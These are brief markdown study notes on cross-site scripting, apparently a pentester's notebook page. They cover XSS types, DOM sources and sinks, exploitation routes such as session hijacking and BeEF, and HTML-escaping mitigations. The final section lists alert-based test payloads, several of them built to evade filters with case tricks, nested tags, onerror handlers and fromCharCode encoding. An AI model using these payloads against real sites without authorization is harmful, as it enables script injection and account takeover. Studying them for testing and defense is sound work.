# XSS

## Types
- Reflected
- Stored
- DOM Based
  - Nothing send to server (check with Burp), instead use both Javascript functions types simultaneously:
    - source
      - ```?name=alireza => document.url()```
    - sink 
      -  ```getElementById()```
      - ```document.write()```

## Exploitation
- Session Hijacking (SEC542-4)
- Fake Page (SEC542-4)
- [BeEF](../Tools/beef.md)

## Mitigation
- Minimize the usage of user input on html
- Escape any untrusted input before inserting it into the page
  - ```&``` => ```&amp;```
  - ```<``` => ```&lt;```
  - ```>``` => ```&gt;```
  - ```"``` => ```&quot;```
  - ```'``` => ```&#x27;```
  - ```/``` => ```&#x2F;```
- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 

## Payloads
```Javascript
'"><script>alert('ehsan')</script>
a<script>alert('ehsan')</script>
a<SCript>alert('ehsan')</SCript>
a<scri<script>pt>alert('ehsan')</scri</script>pt>
a<img src='aaa' onerror='alert("ehsan")'/>
a<script>prompt('ehsan')</script>
a<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 101, 104, 115, 97, 110, 39, 41))</script>
a";alert("ehsan");//
a";alert("ehsan");"
a';alert('ehsan');//
a';alert('ehsan');'
/"><script>alert('ehsan')</script>
```
  
